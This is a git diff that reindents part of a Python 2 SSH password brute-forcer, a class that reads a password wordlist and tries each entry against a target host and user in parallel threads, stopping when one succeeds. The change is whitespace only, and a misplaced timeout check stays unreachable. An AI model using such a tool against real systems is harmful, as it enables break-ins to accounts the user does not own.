@@ -7,10 +7,10 @@ from threading import *
 
 class bSsh:
 	def __init__(self):
-                self.maxConnections = 5
-                self.connection_lock = BoundedSemaphore(value=self.maxConnections)
-                self.Found = False
-                self.Fails = 0
+		self.maxConnections = 5
+		self.connection_lock = BoundedSemaphore(value=self.maxConnections)
+		self.Found = False
+		self.Fails = 0
 
 	def connect(self, host, user, password, release):
 		try:
@@ -31,19 +31,19 @@ class bSsh:
 				self.connection_lock.release()
 
 	def checkMe(self, myHost, myUser, myDict):
-	        fn = open(myDict, 'r')
-        	for line in fn.readlines():
-	                if self.Found:
-        	                print "[*] Exiting: Password Found"
-                	        exit(0)
-                        	if self.Fails > 5:
-                                	print "[!] Exiting: Too Many Socket Timeouts"
-	                                exit(0)
-        	        self.connection_lock.acquire()
-                	password = line.strip('\r').strip('\n')
-	                print "[-] Testing: " + str(password)
-        	        t = Thread(target=self.connect, args=(myHost, myUser, password, True))
-                	child = t.start()
+		fn = open(myDict, 'r')
+		for line in fn.readlines():
+			if self.Found:
+				print "[*] Exiting: Password Found"
+				exit(0)
+				if self.Fails > 5:
+					print "[!] Exiting: Too Many Socket Timeouts"
+					exit(0)
+			self.connection_lock.acquire()
+			password = line.strip('\r').strip('\n')
+			print "[-] Testing: " + str(password)
+			t = Thread(target=self.connect, args=(myHost, myUser, password, True))
+			child = t.start()
 
 def main():
 	exit(0)
